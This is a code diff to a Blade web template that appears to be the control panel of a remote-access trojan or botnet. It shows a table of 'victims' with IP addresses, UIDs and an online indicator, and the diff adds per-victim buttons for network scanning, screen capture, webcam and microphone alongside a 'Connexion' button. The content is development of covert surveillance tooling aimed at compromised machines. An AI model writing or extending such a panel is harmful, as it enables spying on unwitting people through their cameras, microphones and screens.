@@ -42,13 +42,42 @@
                                             <i class="bx bxl-apple"></i>
                                             @endif
                                         </th>
+                                        <td>
+                                            @if ($victim->status == "1")
+                                            <div class="spinner-grow spinner-grow-sm text-success" role="status">
+                                                <span class="visually-hidden">Loading...</span>
+                                            </div>
+                                            @else
+                                            <div class="spinner-grow spinner-grow-sm text-danger" role="status">
+                                                <span class="visually-hidden">Loading...</span>
+                                            </div>
+                                            @endif
+                                        </td>
                                         <td>{{ $victim->ip }}</td>
                                         <td>{{ $victim->uid }}</td>
                                         <form method="POST" action="{{ route('network.scan') }}">
                                             @csrf
                                             <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                             <input type="hidden" name="group_id" value="{{ $group->id }}">
-                                            <td><button type="submit" class="btn btn-success">Scan</button></td>
+                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button></td>
+                                        </form>
+                                        <form method="POST" action="{{ route('network.scan') }}">
+                                            @csrf
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-fullscreen"></i></button></td>
+                                        </form>
+                                        <form method="POST" action="{{ route('network.scan') }}">
+                                            @csrf
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-camera-fill"></i></button></td>
+                                        </form>
+                                        <form method="POST" action="{{ route('network.scan') }}">
+                                            @csrf
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-mic-fill"></i></button></td>
                                         </form>
                                         <td><a class="btn btn-primary">Connexion</a></td>
                                     </tr>
